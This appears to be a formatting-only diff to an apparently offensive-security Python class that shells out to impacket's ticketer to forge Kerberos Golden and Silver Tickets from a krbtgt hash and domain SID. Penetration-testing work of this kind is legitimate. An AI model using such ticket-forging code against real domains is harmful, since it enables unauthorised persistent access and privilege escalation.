@@ -463,10 +463,10 @@ class KerberosAttacks:
                 nt_hash = bytes.fromhex(krbtgt_hash)
 
             # 使用 impacket ticketer 生成 Golden Ticket
+            import os
+
             from impacket.krb5 import constants as krb5_constants  # noqa: F401
             from impacket.krb5.types import KerberosTime, Principal  # noqa: F401
-
-            import os
 
             # 构建 ticketer 命令参数 — 通过 impacket 的 ticketer 模块
             # impacket 没有直接的 Ticket.create() API，需要使用 ticketer 脚本逻辑
@@ -502,16 +502,25 @@ class KerberosAttacks:
             import sys
 
             cmd = [
-                sys.executable, "-m", "impacket.examples.ticketer",
-                "-nthash", nt_hash.hex(),
-                "-domain-sid", domain_sid,
-                "-domain", self.domain,
-                "-groups", ",".join(str(g) for g in groups),
+                sys.executable,
+                "-m",
+                "impacket.examples.ticketer",
+                "-nthash",
+                nt_hash.hex(),
+                "-domain-sid",
+                domain_sid,
+                "-domain",
+                self.domain,
+                "-groups",
+                ",".join(str(g) for g in groups),
                 target_user,
             ]
 
             result = subprocess.run(
-                cmd, capture_output=True, text=True, timeout=30,
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
 
             # ticketer 生成 <username>.ccache 文件
@@ -598,17 +607,27 @@ class KerberosAttacks:
             import sys
 
             cmd = [
-                sys.executable, "-m", "impacket.examples.ticketer",
-                "-nthash", nt_hash.hex(),
-                "-domain-sid", domain_sid,
-                "-domain", self.domain,
-                "-spn", spn,
-                "-groups", ",".join(str(g) for g in groups),
+                sys.executable,
+                "-m",
+                "impacket.examples.ticketer",
+                "-nthash",
+                nt_hash.hex(),
+                "-domain-sid",
+                domain_sid,
+                "-domain",
+                self.domain,
+                "-spn",
+                spn,
+                "-groups",
+                ",".join(str(g) for g in groups),
                 target_user,
             ]
 
             result = subprocess.run(
-                cmd, capture_output=True, text=True, timeout=30,
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=30,
             )
 
             default_ccache = f"{target_user}.ccache"
